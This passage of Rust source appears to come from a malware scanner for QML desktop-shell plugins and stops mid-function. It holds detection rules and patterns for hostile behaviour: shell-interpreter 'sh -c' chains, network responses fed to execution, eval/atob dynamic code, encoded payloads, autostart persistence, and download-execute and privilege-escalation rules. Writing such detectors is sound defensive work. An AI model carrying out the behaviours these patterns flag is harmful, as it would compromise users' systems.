//! S3 detectors: capability observation, suspicious-provenance findings, and
//! invocation-edge resolution over an ingested payload inventory.
//!
//! The rule contract separates ability from suspicion: seeing `Process`,
//! `execDetached`, `FileView`, or a network sink records a capability
//! occurrence; emitting a fingerprintable finding requires suspicious
//! provenance — shell-interpreter chains (`sh -c …`), dynamically composed
//! commands, or a network-response-to-execution chain in the same file.
//!
//! Evidence quality follows the build: with the `qml-parser` feature QML is
//! parsed and conclusions are [`Confidence::AstBacked`]; without it — and for
//! standalone `.js` resources, which the QML grammar cannot parse cleanly —
//! detection is line-lexical and labelled [`Confidence::LexicalFallback`] so
//! report consumers can weigh it accordingly (ADR 0001).
//!
//! Nothing here executes scanned content; parsing and scanning are inert.

use std::collections::BTreeMap;

use omasafe_core::bounds::{MAX_EVIDENCE_BYTES_PER_RESULT, MAX_FILE_BYTES};
use omasafe_report::analysis::{
    CapabilityOccurrence, InvocationEdge, ParserMetadata, RenderedFinding,
};

use crate::TimeBudget;
use crate::fingerprint::{Confidence, NormalizedResult};
use crate::payload::{CoverageState, PayloadEntry, PayloadInventory, PayloadKind};
use crate::rules::{Capability, Language, Severity, rule};

/// Everything one analysis pass produced.
#[derive(Debug, Default)]
pub struct AnalysisArtifacts {
    /// Fingerprintable normalized results (suspicious provenance only).
    pub results: Vec<NormalizedResult>,
    /// Ability observations that never assert malicious intent.
    pub capabilities: Vec<CapabilityOccurrence>,
    /// Resolved literal references between analyzed files.
    pub edges: Vec<InvocationEdge>,
    /// Analysis-level disclosures (budget exhaustion, unavailable content).
    pub limitations: Vec<String>,
}

impl AnalysisArtifacts {
    /// Deterministic rendered findings joined with catalog facts. Duplicate
    /// normalized results collapse so repeated sinks render once.
    pub fn rendered_findings(&self) -> Vec<RenderedFinding> {
        let mut seen = std::collections::BTreeSet::new();
        let mut rendered = Vec::new();
        for result in &self.results {
            let key = (
                result.rule_id().to_owned(),
                result.relative_path().to_owned(),
                result.line(),
                result.semantic_value().to_owned(),
            );
            if !seen.insert(key) {
                continue;
            }
            let Some(definition) = rule(result.rule_id()) else {
                continue;
            };
            rendered.push((
                definition.default_severity,
                RenderedFinding {
                    rule_id: definition.id.to_owned(),
                    title: definition.title.to_owned(),
                    severity: definition.default_severity.to_string(),
                    language: definition.language.to_string(),
                    capability: definition.capability.to_string(),
                    relative_path: result.relative_path().to_owned(),
                    line: result.line(),
                    evidence: truncate_bytes(
                        result.semantic_value(),
                        MAX_EVIDENCE_BYTES_PER_RESULT,
                    ),
                    confidence: result.confidence().map(|confidence| match confidence {
                        Confidence::AstBacked => "ast-backed".to_owned(),
                        Confidence::LexicalFallback => "lexical-fallback".to_owned(),
                    }),
                    explanation: definition.summary.to_owned(),
                    review_guidance: definition.review_guidance.to_owned(),
                },
            ));
        }
        // Priority surfaces first: highest severity dominates the report view,
        // with stable path/rule/line ordering within a severity band.
        rendered.sort_by(|(severity_a, finding_a), (severity_b, finding_b)| {
            severity_b.cmp(severity_a).then_with(|| {
                (
                    &finding_a.relative_path,
                    &finding_a.rule_id,
                    finding_a.line,
                    &finding_a.evidence,
                )
                    .cmp(&(
                        &finding_b.relative_path,
                        &finding_b.rule_id,
                        finding_b.line,
                        &finding_b.evidence,
                    ))
            })
        });
        rendered.into_iter().map(|(_, finding)| finding).collect()
    }

    /// Highest finding severity, for `--fail-on` threshold decisions.
    pub fn max_severity(&self) -> Option<Severity> {
        self.results
            .iter()
            .filter_map(|result| rule(result.rule_id()))
            .map(|definition| definition.default_severity)
            .max()
    }
}

/// Parser identity for report embedding; `None` in lexical-fallback builds.
pub fn parser_metadata() -> Option<ParserMetadata> {
    #[cfg(feature = "qml-parser")]
    {
        let identity = crate::qml::qml_parser_identity();
        Some(ParserMetadata {
            grammar: identity.grammar.to_owned(),
            grammar_version: identity.grammar_version.to_owned(),
            tree_sitter_version: identity.tree_sitter_version.to_owned(),
            language_abi_version: identity.language_abi_version,
        })
    }
    #[cfg(not(feature = "qml-parser"))]
    None
}

fn truncate_bytes(value: &str, cap: usize) -> String {
    if value.len() <= cap {
        return value.to_owned();
    }
    let mut end = cap;
    while end > 0 && !value.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &value[..end])
}

/// Run every detector over a fully ingested inventory. `read_content` must
/// return bounded bytes for an entry; entries without a detector are skipped.
///
/// On return the inventory's analyzable entries carry final coverage states:
/// `analyzed` (findings reference them), `partial` (syntax errors degraded the
/// parse), or `unreferenced` (fully analyzed and reachable analysis found
/// nothing). Edge targets gain `referenced = true`.
pub fn analyze_inventory(
    inventory: &mut PayloadInventory,
    read_content: &dyn Fn(&PayloadEntry) -> Option<Vec<u8>>,
    budget: &TimeBudget,
) -> AnalysisArtifacts {
    let mut artifacts = AnalysisArtifacts::default();
    let mut by_path: BTreeMap<String, usize> = BTreeMap::new();
    for (index, entry) in inventory.entries.iter().enumerate() {
        by_path.insert(entry.relative_path.clone(), index);
    }

    struct PendingEdge {
        from_path: String,
        line: u32,
        value: String,
    }
    let mut pending_edges: Vec<PendingEdge> = Vec::new();

    for index in 0..inventory.entries.len() {
        if budget.expired() {
            artifacts
                .limitations
                .push("analysis_time_budget_exhausted".to_owned());
            break;
        }
        let entry = inventory.entries[index].clone();

        // Plugin manifests feed context results/capabilities (bar kind,
        // headless services). They are not language analysis.
        if entry.relative_path.ends_with("/manifest.json") || entry.relative_path == "manifest.json"
        {
            if entry.size <= MAX_FILE_BYTES {
                if let Some(content) = read_content(&entry) {
                    apply_manifest_context(&content, &entry.relative_path, &mut artifacts);
                } else {
                    artifacts
                        .limitations
                        .push(format!("content_unavailable:{}", entry.relative_path));
                }
            }
            continue;
        }

        let analyzable = matches!(
            entry.kind,
            PayloadKind::Qml | PayloadKind::JavaScript | PayloadKind::Shell | PayloadKind::Python
        );
        if !analyzable
            || !matches!(entry.coverage_state, CoverageState::Unsupported)
            || entry.size > MAX_FILE_BYTES
        {
            continue;
        }
        let Some(content) = read_content(&entry) else {
            artifacts
                .limitations
                .push(format!("content_unavailable:{}", entry.relative_path));
            continue;
        };
        let source = String::from_utf8_lossy(&content).into_owned();

        let entry_kind = entry.kind;
        let mut outcome = match &entry_kind {
            PayloadKind::Qml => analyze_qml_source(&source),
            PayloadKind::JavaScript => analyze_javascript_source(&source),
            kind @ (PayloadKind::Shell | PayloadKind::Python) => {
                let script_kind = kind.clone();
                analyze_script_source(&source, script_kind)
            }
            _ => unreachable!("kinds filtered above"),
        };

        // Anchor results onto the entry's canonical relative path.
        for candidate in &outcome.result_parts {
            if let Ok(normalized) = NormalizedResult::new(
                candidate.rule_id,
                &entry.relative_path,
                candidate.line,
                None,
                candidate.semantic_value.clone(),
                Some(candidate.confidence),
            ) {
                artifacts.results.push(normalized);
            }
        }
        for capability in &mut outcome.capabilities {
            capability.relative_path = entry.relative_path.clone();
            capability.confidence = Some(
                match outcome.confidence {
                    Confidence::AstBacked => "ast-backed",
                    Confidence::LexicalFallback => "lexical-fallback",
                }
                .to_owned(),
            );
        }
        // Decide the coverage state BEFORE draining observations.
        let produced_observations = outcome.has_findings() || !outcome.capabilities.is_empty();
        artifacts.capabilities.append(&mut outcome.capabilities);
        for (line, value) in outcome.references.drain(..) {
            pending_edges.push(PendingEdge {
                from_path: entry.relative_path.clone(),
                line,
                value,
            });
        }

        // `analyzed` means detectors produced observations (findings or
        // capabilities); `unreferenced` means they ran and saw nothing.
        // Shell/Python are always `partial`: minimal lexical coverage means
        // no match never implies clean behavior. Parse-degraded QML/JS is
        // likewise partial.
        inventory.entries[index].coverage_state =
            if matches!(entry_kind, PayloadKind::Shell | PayloadKind::Python)
                || outcome.parse_degraded
            {
                CoverageState::Partial
            } else if produced_observations {
                CoverageState::Analyzed
            } else {
                CoverageState::Unreferenced
            };
    }

    // Resolve literal references strictly inside the logical root.
    let mut resolved: Vec<InvocationEdge> = Vec::new();
    for edge in pending_edges {
        let Some(target_index) =
            resolve_reference(inventory, &by_path, &edge.from_path, &edge.value)
        else {
            continue;
        };
        inventory.entries[target_index].invocation_target = true;
        resolved.push(InvocationEdge {
            from_path: edge.from_path,
            line: Some(edge.line),
            target_path: inventory.entries[target_index].relative_path.clone(),
        });
    }
    resolved.sort_by(|a, b| (&a.from_path, &a.target_path).cmp(&(&b.from_path, &b.target_path)));
    resolved.dedup_by(|a, b| a.from_path == b.from_path && a.target_path == b.target_path);
    artifacts.edges = resolved;

    artifacts.capabilities.sort_by(|a, b| {
        (&a.capability, &a.relative_path, a.line, &a.detail).cmp(&(
            &b.capability,
            &b.relative_path,
            b.line,
            &b.detail,
        ))
    });
    artifacts.capabilities.dedup_by(|a, b| {
        a.capability == b.capability
            && a.relative_path == b.relative_path
            && a.line == b.line
            && a.detail == b.detail
    });

    artifacts
}

/// Resolve one literal reference against the inventory: plain relative paths
/// to inventoried files only — never traversal segments, schemes, absolute
/// paths, directories, or symlinks. Any bundled file can be an invocation
/// target (`Loader` sources, `FileView` paths, script payloads alike); the
/// existence check against the inventory is what keeps ordinary prose out.
/// Cheap path-likeness prefilter; the inventory existence check in
/// [`resolve_reference`] is the real gate.
fn is_path_shaped(value: &str) -> bool {
    if value.is_empty() || value.len() > 512 {
        return false;
    }
    value.contains('/') || (value.contains('.') && !value.contains(' '))
}

fn resolve_reference(
    inventory: &PayloadInventory,
    by_path: &BTreeMap<String, usize>,
    from_path: &str,
    value: &str,
) -> Option<usize> {
    if value.is_empty()
        || value.len() > 512
        || value.starts_with('/')
        || value.contains(':')
        || value.contains(' ')
        || value.contains('\n')
    {
        return None;
    }
    // Leading "./" is ordinary relative spelling; only inner traversal
    // segments are hostile.
    let stripped = value.trim_start_matches("./");
    if stripped.is_empty()
        || stripped
            .split('/')
            .any(|segment| segment == "." || segment == "..")
    {
        return None;
    }
    // QML/JS references resolve relative to the referencing file first;
    // repository-root-relative spellings are the fallback.
    let mut candidate_paths: Vec<String> = Vec::new();
    if let Some((directory, _file)) = from_path.rsplit_once('/') {
        candidate_paths.push(format!("{}/{}", directory, stripped));
    }
    candidate_paths.push(stripped.to_owned());
    for candidate in candidate_paths {
        if let Some(index) = by_path.get(candidate.as_str()) {
            if matches!(
                inventory.entries[*index].kind,
                PayloadKind::Symlink | PayloadKind::Directory | PayloadKind::Special
            ) {
                return None;
            }
            return Some(*index);
        }
    }
    None
}

/// Per-file detector output before cross-file anchoring.
struct FileOutcome {
    result_parts: Vec<ResultParts>,
    capabilities: Vec<CapabilityOccurrence>,
    references: Vec<(u32, String)>,
    parse_degraded: bool,
    confidence: Confidence,
}

impl FileOutcome {
    fn has_findings(&self) -> bool {
        !self.result_parts.is_empty()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SinkKind {
    Process,
    DetachedExecution,
}

const PROCESS_RULE: &str = "oma.qml.process-execution";
const DETACHED_RULE: &str = "oma.qml.detached-execution";
#[cfg_attr(not(test), allow(dead_code))]
const NETWORK_RULE: &str = "oma.qml.network-access";
#[cfg(feature = "qml-parser")]
const DYNAMIC_REFERENCE_RULE: &str = "oma.qml.dynamic-reference";
#[cfg_attr(not(test), allow(dead_code))]
const DYNAMIC_CODE_RULE: &str = "oma.qml.dynamic-code";
#[cfg_attr(not(test), allow(dead_code))]
const OBFUSCATION_RULE: &str = "oma.qml.obfuscated-payload-indicator";
const PERSISTENCE_RULE: &str = "oma.qml.persistence-scheduling";
const SCRIPT_DOWNLOAD_EXECUTE_RULE: &str = "oma.script.download-execute";
const SCRIPT_PRIVILEGE_RULE: &str = "oma.script.privilege-escalation";
const PYTHON_DOWNLOAD_EXECUTE_RULE: &str = "oma.python.download-execute";
const PYTHON_PRIVILEGE_RULE: &str = "oma.python.privilege-escalation";
const REPLACES_BAR_RULE: &str = "oma.context.replaces-bar";

struct LexFlags {
    detached_any: Option<u32>,
    network: Option<u32>,
}

fn parts(
    rule_id: &'static str,
    line: u32,
    semantic_value: impl Into<String>,
    confidence: Confidence,
) -> ResultParts {
    ResultParts {
        rule_id,
        line: Some(line),
        semantic_value: truncate_bytes(&semantic_value.into(), MAX_EVIDENCE_BYTES_PER_RESULT),
        confidence,
    }
}

fn occurrence(
    capability: Capability,
    language: Language,
    line: u32,
    detail: &str,
) -> CapabilityOccurrence {
    // Script-language capability context has no dedicated catalog rule yet;
    // attributing it to QML rules would produce misleading guidance.
    let covering_rule = if matches!(language, Language::Shell | Language::Python) {
        None
    } else {
        capability_covering_rule(capability)
    }
    .and_then(crate::rules::rule);
    CapabilityOccurrence {
        capability: capability.to_string(),
        language: language.to_string(),
        relative_path: String::new(),
        line: Some(line),
        source_rule_id: covering_rule.map(|definition| definition.id.to_owned()),
        detail: truncate_bytes(detail, 200),
        confidence: None,
        explanation: covering_rule
            .map(|definition| definition.summary.to_owned())
            .unwrap_or_else(|| {
                "script capability observed; lexical coverage is minimal by design".to_owned()
            }),
        review_guidance: covering_rule
            .map(|definition| definition.review_guidance.to_owned())
            .unwrap_or_else(|| "Review the surrounding script manually".to_owned()),
    }
}

fn capability_covering_rule(capability: Capability) -> Option<&'static str> {
    match capability {
        Capability::ProcessExecution => Some("oma.qml.process-execution"),
        Capability::DetachedProcessExecution => Some("oma.qml.detached-execution"),
        Capability::FilesystemAccess => Some("oma.qml.filesystem-access"),
        Capability::NetworkAccess => Some("oma.qml.network-access"),
        Capability::PersistenceScheduling => Some(PERSISTENCE_RULE),
        Capability::ClipboardAccess => Some("oma.qml.clipboard-access"),
        Capability::CompositorControl => Some("oma.qml.compositor-control"),
        Capability::PolkitAgentUi => Some("oma.qml.polkit-agent-ui"),
        Capability::SessionLockSurface => Some("oma.qml.session-lock"),
        Capability::PamAuthentication => Some("oma.qml.pam-authentication"),
        Capability::DynamicCodeExecution => Some(DYNAMIC_CODE_RULE),
        _ => None,
    }
}

/// Shell-interpreter invocation inside a command string: an interpreter word
/// followed (after whitespace) by a `-c`-style flag. Returns the byte offset
/// of the interpreter word for evidence trimming.
fn find_shell_interpreter(text: &str) -> Option<usize> {
    const INTERPRETERS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ksh", "ash"];
    let bytes = text.as_bytes();
    let mut position = 0usize;
    while position < bytes.len() {
        // Advance to the next word start; path separators stay inside words
        // so `/bin/sh -c` scans as basename `sh`.
        while position < bytes.len()
            && !bytes[position].is_ascii_alphanumeric()
            && bytes[position] != b'/'
        {
            position += 1;
        }
        if position >= bytes.len() {
            break;
        }
        let start = position;
        while position < bytes.len()
            && (bytes[position].is_ascii_alphanumeric() || bytes[position] == b'/')
        {
            position += 1;
        }
        let word = &text[start..position];
        let basename = word.rsplit('/').next().unwrap_or(word);
        if INTERPRETERS.contains(&basename) {
            // Skip whitespace, then require a `-c…` style flag.
            let mut cursor = position;
            while cursor < bytes.len() && (bytes[cursor] == b' ' || bytes[cursor] == b'\t') {
                cursor += 1;
            }
            if cursor + 1 < bytes.len()
                && bytes[cursor] == b'-'
                && bytes[cursor + 1] == b'c'
                && (cursor + 2 == bytes.len()
                    || bytes[cursor + 2] == b' '
                    || bytes[cursor + 2] == b'\t')
            {
                return Some(start);
            }
        }
        // Skip past this word even when it did not match.
        while position < bytes.len() && bytes[position] != b' ' {
            position += 1;
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Lexical analysis: standalone .js always, and all QML in fallback builds.
// ---------------------------------------------------------------------------

fn lexical_scan(source: &str, language: Language) -> FileOutcome {
    let mut outcome = FileOutcome {
        result_parts: Vec::new(),
        capabilities: Vec::new(),
        references: Vec::new(),
        parse_degraded: false,
        confidence: Confidence::LexicalFallback,
    };
    let mut flags = LexFlags {
        detached_any: None,
        network: None,
    };

    for (index, raw_line) in source.lines().enumerate() {
        let number = index as u32 + 1;
        // One shared quote-aware trim: commented-out code is invisible to
        // every detector below, while quoted text survives intact.
        let line = strip_line_comment(raw_line, CommentStyle::DoubleSlash);
        if line.is_empty() {
            continue;
        }
        // Every occurrence gets its own argument judgment: a benign first
        // call must not mask a suspicious later one.
        let mut search_from = 0usize;
        while let Some(relative_offset) = find_word(&line[search_from..], "execDetached") {
            let offset = search_from + relative_offset;
            search_from = offset + "execDetached".len();
            flags.detached_any.get_or_insert(number);
            outcome.capabilities.push(occurrence(
                Capability::DetachedProcessExecution,
                language,
                number,
                &line[offset..],
            ));
            // The call's own paren: first '(' after the name, skipping only
            // whitespace.
            let mut cursor = search_from;
            while cursor < line.len() && matches!(line.as_bytes()[cursor], b' ' | b'\t') {
                cursor += 1;
            }
            if cursor < line.len()
                && line.as_bytes()[cursor] == b'('
                && let Some((start, end)) = balanced_bracket_span(line, cursor)
            {
                evaluate_execution_span(
                    &line[start..end],
                    SinkKind::DetachedExecution,
                    number,
                    &mut outcome,
                );
            }
        }
        let is_network_line = line.contains("new XMLHttpRequest")
            || find_word(line, "fetch(").is_some()
            || line.contains("WebSocket");
        if is_network_line {
            flags.network.get_or_insert(number);
            outcome.capabilities.push(occurrence(
                Capability::NetworkAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "FileView").is_some() {
            outcome.capabilities.push(occurrence(
                Capability::FilesystemAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "Timer").is_some() {
            outcome.capabilities.push(occurrence(
                Capability::PersistenceScheduling,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "Process").is_some() {
            // Every `command` binding gets its own judgment; the line is
            // already comment-trimmed by strip_line_comment.
            let mut search_from = 0usize;
            while let Some(relative_offset) = find_word(&line[search_from..], "command") {
                let word = search_from + relative_offset;
                search_from = word + "command".len();
                outcome.capabilities.push(occurrence(
                    Capability::ProcessExecution,
                    language,
                    number,
                    line.trim(),
                ));
                // Suspicious provenance only, judged on the binding value:
                // shell-interpreter chains or network response data.
                if let Some((start, end)) = binding_value_span(line, search_from) {
                    evaluate_execution_span(
                        &line[start..end],
                        SinkKind::Process,
                        number,
                        &mut outcome,
                    );
                }
            }
        }
        // Priority surfaces (lexical parity with the AST path).
        if find_word(line, "Polkit").is_some() {
            outcome.result_parts.push(parts(
                "oma.qml.polkit-agent-ui",
                number,
                "polkit-surface",
                Confidence::LexicalFallback,
            ));
        }
        if find_word(line, "PamContext").is_some() || line.contains("Services.Pam") {
            outcome.result_parts.push(parts(
                "oma.qml.pam-authentication",
                number,
                "pam-surface",
                Confidence::LexicalFallback,
            ));
        }
        if find_word(line, "WlSessionLock").is_some() {
            outcome.result_parts.push(parts(
                "oma.qml.session-lock",
                number,
                "session-lock-surface",
                Confidence::LexicalFallback,
            ));
        }
        if lower_contains(line, "clipboard") {
            outcome.capabilities.push(occurrence(
                Capability::ClipboardAccess,
                language,
                number,
                "clipboard-token",
            ));
        }
        // Hyprland* type prefixes don't satisfy word-end boundaries, so a
        // plain containment check applies; this family is capability-level.
        if line.contains("Hyprland") || line.contains("Wlr") || find_word(line, "hyprctl").is_some()
        {
            outcome.capabilities.push(occurrence(
                Capability::CompositorControl,
                language,
                number,
                "compositor-token",
            ));
        }
        if find_word(line, "eval(").is_some()
            || find_word(line, "createQmlObject(").is_some()
            || find_word(line, "atob(").is_some()
            || line.contains("new Function")
        {
            outcome.result_parts.push(parts(
                DYNAMIC_CODE_RULE,
                number,
                "dynamic-code-construction",
                Confidence::LexicalFallback,
            ));
            outcome.capabilities.push(occurrence(
                Capability::DynamicCodeExecution,
                language,
                number,
                line.trim(),
            ));
        }
        for literal in line_literals(line) {
            if let Some(length) = encoded_literal_length(literal) {
                outcome.result_parts.push(parts(
                    OBFUSCATION_RULE,
                    number,
                    format!("encoded-literal:{length}"),
                    Confidence::LexicalFallback,
                ));
                break;
            }
        }
        let persistence_path = (line.contains("autostart")
            || line.contains("systemd/user")
            || line.contains(".config/systemd"))
            && find_word(line, "FileView").is_some();
        if persistence_path {
            outcome.result_parts.push(parts(
                PERSISTENCE_RULE,
                number,
                "persistence-location",
                Confidence::LexicalFallback,
            ));
        }
        collect_quoted_references(line, number, &mut outcome.references);
    }

    outcome
}

fn lower_contains(haystack: &str, needle: &str) -> bool {
    haystack.to_ascii_lowercase().contains(needle)
}

/// Suspicious-provenance judgment over an extracted execution-argument span.
fn evaluate_execution_span(span: &str, kind: SinkKind, number: u32, outcome: &mut FileOutcome) {
    let rule_id = match kind {
        SinkKind::Process => PROCESS_RULE,
        SinkKind::DetachedExecution => DETACHED_RULE,
    };
    let joined = join_line_literals(span);
    if let Some(shell_offset) = find_shell_interpreter(&joined) {
        outcome.result_parts.push(parts(
            rule_id,
            number,
            format!("shell-interpreter-command:{}", &joined[shell_offset..]),
            Confidence::LexicalFallback,
        ));
    } else if span.contains("responseText") || span.contains(".response") || span.contains(".text(")
    {
        outcome.result_parts.push(parts(
            rule_id,
            number,
            "network-response-executed",
            Confidence::LexicalFallback,
        ));
    }
}

/// The bracketed span starting at `open` ('(' or '['): to its matching
/// closer, honoring nesting and quoted strings.
fn balanced_bracket_span(text: &str, open: usize) -> Option<(usize, usize)> {
    let bytes = text.as_bytes();
    let opener = *bytes.get(open)?;
    let closer = match opener {
        b'(' => b')',
        b'[' => b']',
        b'{' => b'}',
        _ => return None,
    };
    let mut depth = 0usize;
    let mut index = open;
    let mut in_string: Option<u8> = None;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                } else if byte == opener {
                    depth += 1;
                } else if byte == closer {
                    depth -= 1;
                    if depth == 0 {
                        return Some((open + 1, index));
                    }
                }
            }
        }
        index += 1;
    }
    None
}

/// The value span after `property:` on one line, stopping at a closing
/// brace/comma at bracket depth zero.
fn binding_value_span(line: &str, property_word_end: usize) -> Option<(usize, usize)> {
    let colon = line[property_word_end..]
        .find(':')
        .map(|offset| property_word_end + offset)?;
    let mut start = colon + 1;
    while start < line.len() && line[start..].starts_with([' ', '\t']) {
        start += 1;
    }
    if start >= line.len() {
        return None;
    }
    let bytes = line.as_bytes();
    if matches!(bytes[start], b'[' | b'(' | b'{') {
        return balanced_bracket_span(line, start).map(|(_, end)| (start, end + 1));
    }
    // Scalar value runs to the first top-level terminator: brace, semicolon,
    // or a line comment. Commented text never participates in provenance.
    let mut end = start;
    while end < line.len() && !matches!(bytes[end], b'}' | b';') {
        if bytes[end] == b'/' && end + 1 < line.len() && bytes[end + 1] == b'/' {
            break;
        }
        end += 1;
    }
    let trimmed = line[start..end].trim_end();
    Some((start, start + trimmed.len()))
}

/// Comment syntax of the surrounding language. The three real grammars
/// differ and each gets its own rule:
/// - QML/JS: `//` anywhere outside strings except in a scheme (`://`),
/// - Python: an unquoted `#` starts a comment at ANY position,
/// - POSIX shell: `#` starts a comment only at a word boundary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CommentStyle {
    /// `// …` — QML/JS.
    DoubleSlash,
    /// `# …` anywhere outside strings — Python.
    PythonHash,
    /// `# …` at word boundaries only — POSIX shell.
    ShellHash,
}

/// The executable prefix of a source line under the language's comment rule,
/// honoring quoted strings throughout.
fn strip_line_comment(line: &str, style: CommentStyle) -> &str {
    let bytes = line.as_bytes();
    let mut in_string: Option<u8> = None;
    let mut index = 0usize;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                    continue;
                }
                match style {
                    CommentStyle::DoubleSlash => {
                        if byte == b'/'
                            && index + 1 < bytes.len()
                            && bytes[index + 1] == b'/'
                            // Scheme guard: `https://host` is not a comment.
                            && (index == 0 || bytes[index - 1] != b':')
                        {
                            return &line[..index];
                        }
                    }
                    CommentStyle::PythonHash => {
                        if byte == b'#' {
                            return &line[..index];
                        }
                    }
                    CommentStyle::ShellHash => {
                        if byte == b'#' && (index == 0 || matches!(bytes[index - 1], b' ' | b'\t'))
                        {
                            return &line[..index];
                        }
                    }
                }
            }
        }
        index += 1;
    }
    line
}

/// Module name of an `import X.Y <version>` statement (keyword/version/as
/// excluded).
#[cfg(feature = "qml-parser")]
fn import_module_text(source: &str, node: tree_sitter::Node) -> String {
    let mut cursor = node.walk();
    let mut module = String::new();
    let mut children = Vec::new();
    for child in node.children(&mut cursor) {
        children.push(child);
    }
    // The grammar nests the module under nested_identifier when dotted;
    // otherwise a plain identifier. Version numbers are anonymous literals.
    for child in children {
        match child.kind() {
            "nested_identifier" | "identifier" => {
                module.push_str(&source[child.start_byte()..child.end_byte()]);
            }
            _ => {}
        }
    }
    module
}

/// Priority surfaces from imports. Near-zero-legitimacy third-party use of
/// polkit/PAM/session-lock APIs is itself the finding (surface doc); Hyprland/
/// Wayland imports record a compositor-control capability.
#[cfg(feature = "qml-parser")]
fn apply_import_surface(module: &str, line: u32, outcome: &mut FileOutcome) {
    if module.contains("Services.Polkit") {
        outcome.result_parts.push(parts(
            "oma.qml.polkit-agent-ui",
            line,
            "polkit-agent-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("PamContext") || module.contains("Services.Pam") {
        outcome.result_parts.push(parts(
            "oma.qml.pam-authentication",
            line,
            "pam-context-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("SessionLock") {
        outcome.result_parts.push(parts(
            "oma.qml.session-lock",
            line,
            "session-lock-import",
            Confidence::AstBacked,
        ));
    }
    if module.contains("Hyprland") || module.ends_with(".Wayland") || module.contains("Wlr") {
        outcome.capabilities.push(occurrence(
            Capability::CompositorControl,
            Language::Qml,
            line,
            &format!("import {module}"),
        ));
    }
}

/// Identifier/property tokens that mark priority or context surfaces.
#[cfg(feature = "qml-parser")]
fn apply_surface_token(
    source: &str,
    node: tree_sitter::Node,
    outcome: &mut FileOutcome,
    line: u32,
) {
    let _ = node;
    let text = &source[node.start_byte()..node.end_byte()];
    match text {
        "WlSessionLock" | "WlSessionLockSurface" => {
            outcome.result_parts.push(parts(
                "oma.qml.session-lock",
                line,
                format!("session-lock-type:{text}"),
                Confidence::AstBacked,
            ));
        }
        "PamContext" => {
            outcome.result_parts.push(parts(
                "oma.qml.pam-authentication",
                line,
                "pam-context-type",
                Confidence::AstBacked,
            ));
        }
        _ => {}
    }
    let lower = text.to_ascii_lowercase();
    if lower.contains("clipboard") {
        outcome.capabilities.push(occurrence(
            Capability::ClipboardAccess,
            Language::Qml,
            line,
            text,
        ));
    } else if text.starts_with("Hyprland") || text.starts_with("Wlr") || lower == "hyprctl" {
        outcome.capabilities.push(occurrence(
            Capability::CompositorControl,
            Language::Qml,
            line,
            text,
        ));
    }
}

/// Length of a base64-shaped literal worth surfacing as an indicator.
fn encoded_literal_length(content: &str) -> Option<usize> {
    let length = content.len();
    if length < 64 {
        return None;
    }
    let mut letters = false;
    let mut digits = false;
    for byte in content.bytes() {
        match byte {
            b'a'..=b'z' | b'A'..=b'Z' => letters = true,
            b'0'..=b'9' => digits = true,
            b'+' | b'/' | b'=' | b'_' | b'-' => {}
            _ => return None,
        }
    }
    (letters && digits).then_some(length)
}
fn find_word(haystack: &str, needle: &str) -> Option<usize> {
    let bytes = haystack.as_bytes();
    let mut start = 0usize;
    while let Some(position) = haystack[start..].find(needle) {
        let absolute = start + position;
        let before_ok = absolute == 0 || !bytes[absolute - 1].is_ascii_alphanumeric();
        let after = absolute + needle.len();
        // Needles ending in punctuation (`eval(`) are followed by identifier
        // characters by design; only word-tailed needles require a word end.
        let requires_word_end = needle
            .chars()
            .last()
            .is_some_and(|character| character.is_ascii_alphanumeric());
        let after_ok =
            !requires_word_end || after >= bytes.len() || !bytes[after].is_ascii_alphanumeric();
        if before_ok && after_ok {
            return Some(absolute);
        }
        start = absolute + needle.len().max(1);
    }
    None
}

/// All quoted literals on one line joined with single spaces, so argv-style
/// sources like `"sh", "-c", "cmd"` reconstruct into scannable text.
fn join_line_literals(line: &str) -> String {
    line_literals(line).join(" ")
}

/// Quoted string literals that look like paths become reference candidates.
fn collect_quoted_references(line: &str, number: u32, references: &mut Vec<(u32, String)>) {
    for literal in line_literals(line) {
        if is_path_shaped(literal) {
            references.push((number, literal.to_owned()));
        }
    }
}

fn line_literals(line: &str) -> Vec<&str> {
    let bytes = line.as_bytes();
    let mut literals = Vec::new();
    let mut index = 0usize;
    while index < bytes.len() {
        let quote = bytes[index];
        if quote != b'"' && quote != b'\'' {
            index += 1;
            continue;
        }
        match line[index + 1..].find(quote as char) {
            Some(length) => {
                literals.push(&line[index + 1..index + 1 + length]);
                index += length + 2;
            }
            None => break,
        }
    }
    literals
}

/// One detector observation before path anchoring.
struct ResultParts {
    rule_id: &'static str,
    line: Option<u32>,
    semantic_value: String,
    confidence: Confidence,
}

// ---------------------------------------------------------------------------
// Public per-language entry points.
// ---------------------------------------------------------------------------

fn analyze_javascript_source(source: &str) -> FileOutcome {
    lexical_scan(source, Language::JavaScript)
}

/// Minimal high-signal lexical rules for bundled shell/Python payloads.
/// Coverage is always labelled `partial`; no match never implies clean.
fn analyze_script_source(source: &str, kind: PayloadKind) -> FileOutcome {
    let mut outcome = FileOutcome {
        result_parts: Vec::new(),
        capabilities: Vec::new(),
        references: Vec::new(),
        parse_degraded: false,
        confidence: Confidence::LexicalFallback,
    };
    let language = match kind {
        PayloadKind::Python => Language::Python,
        _ => Language::Shell,
    };
    let (download_rule, privilege_rule) = match kind {
        PayloadKind::Python => (PYTHON_DOWNLOAD_EXECUTE_RULE, PYTHON_PRIVILEGE_RULE),
        _ => (SCRIPT_DOWNLOAD_EXECUTE_RULE, SCRIPT_PRIVILEGE_RULE),
    };

    for (index, raw_line) in source.lines().enumerate() {
        let number = index as u32 + 1;
        let comment_style = match kind {
            PayloadKind::Python => CommentStyle::PythonHash,
            _ => CommentStyle::ShellHash,
        };
